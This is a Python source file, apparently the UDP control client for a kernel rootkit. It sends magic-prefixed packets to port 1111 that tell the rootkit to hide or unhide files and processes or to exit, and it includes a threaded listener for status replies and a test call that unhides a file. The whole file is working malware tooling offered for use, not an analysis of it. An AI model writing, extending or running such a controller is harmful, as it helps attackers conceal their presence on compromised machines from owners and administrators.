import sys
import random
import struct
from enum import Enum
from threading import Condition, Thread
from socket import socket, IPPROTO_UDP, SOCK_DGRAM, AF_INET, SocketType, timeout as timeout_error

from typing import Dict, Optional

JOB_ID_SIZE = 2
REQUEST_PORT = 1111
MAGIC = b'mrk'


class CommandType(Enum):
    HIDE_FILE = b'hfile'
    UNHIDE_FILE = b'ufile'
    HIDE_PROCESS = b'hproc'
    UNHIDE_PROCESS = b'uproc'
    EXIT = b'fexit'


class Client:
    def __init__(self, remote=None, timeout=2):
        self._sock: SocketType = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
        # TODO: Should the socket just be non-blocking? That might slow down all other threads.
        self._sock.settimeout(0.1)
        self._timeout = timeout
        # TODO: Use TTLCache from cacheutils to free responses that have not been awaited to.
        self._responses: Dict[int, int] = {}
        self._conditions: Dict[int, Condition] = {}
        self._thread = Thread(target=self._listen_for_responses)
        self._should_stop = False
        self._remote = remote
        self._thread.start()

    def bind(self, remote):
        self._remote = remote

    def sendto(self, remote: str, command: CommandType, argument: str = ''):
        # TODO: Switch to randbytes in python 3.9
        job_id = random.randint(0, 2 ** JOB_ID_SIZE * 8 - 1)
        # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
        msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
        self._sock.sendto(msg, (remote, REQUEST_PORT))
        return self._await_response(job_id)

    def send(self, command: CommandType, argument: str = ''):
        return self.sendto(self._remote, command, argument)

    def close(self):
        self._should_stop = True
        self._thread.join()
        self._sock.close()

    def _submit_response(self, job_id: int, status: int) -> None:
        with self._conditions.setdefault(job_id, Condition()):
            self._responses[job_id] = status
            self._conditions[job_id].notify()

    def _await_response(self, job_id: int) -> Optional[int]:
        with self._conditions.setdefault(job_id, Condition()):
            notified = self._conditions[job_id].wait_for(lambda: job_id in self._responses, timeout=self._timeout)
        # Check whether the timeout was reached.
        if not notified:
            return None
        # Free the condition and response to avoid the memory usage inflating.
        del self._conditions[job_id]
        return self._responses.pop(job_id)

    def _listen_for_responses(self):
        while not self._should_stop:
            try:
                response = self._sock.recv(3)
            except timeout_error:
                continue
            job_id, response_status = struct.unpack('Hb', response)
            self._submit_response(job_id, response_status)


if __name__ == '__main__':
    s = Client(sys.argv[1])
    print(s.send(CommandType.UNHIDE_FILE, '/home/yanayg/test_file2'))
    s.close()
